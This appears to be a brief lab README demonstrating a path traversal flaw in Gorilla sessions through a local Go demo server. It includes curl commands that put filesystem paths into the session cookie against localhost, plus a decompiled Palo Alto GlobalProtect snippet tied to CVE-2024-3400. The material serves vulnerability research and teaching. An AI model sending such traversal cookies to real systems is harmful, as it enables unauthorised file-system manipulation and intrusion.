# A Gorilla Session Vulnerable to Path Directory Traversal

```bash
export SESSION_KEY=gorilla
```

```bash
go run escapezoo.go
```

# Path Directory Traversal

```bash
curl --cookie "zoo=$PREFIX/tmp" http://localhost:8080
```

```bash
curl --cookie "zoo=$HOME/" http://localhost:8080
```

# Palo Alto Global Protect CVE-2024-3400 related vulnerability

```if ( os_IsNotExist(fmta._r2) )
      {
        store_8b = (github_com_gorilla_sessions_Store_0)net_http__ptr_Request_Context(r);
        ctxb = store_8b.tab;
        v52 = runtime_convTstring((string)s->path);
        v6 = (_1_interface_ *)runtime_newobject((runtime__type_0 *)&RTYPE__1_interface_);
        v51 = (interface__0 *)v6;
        (*v6)[0].tab = (void *)&RTYPE_string_0;
        if ( *(_DWORD *)&runtime_writeBarrier.enabled )
          runtime_gcWriteBarrier();
        else
          (*v6)[0].data = v52;
        storee.tab = ctxb;
        storee.data = store_8b.data;
        fmtb.str = (uint8 *)"folder is missing, create folder %s";
        fmtb.len = 35LL;
        fmt_16a.array = v51;
        fmt_16a.len = 1LL;
        fmt_16a.cap = 1LL;
        paloaltonetworks_com_libs_common_Warn(storee, fmtb, fmt_16a);
        err_1 = os_MkdirAll((string)s->path, 0644u);
```

[https://labs.watchtowr.com/palo-alto-putting-the-protecc-in-globalprotect-cve-2024-3400/]
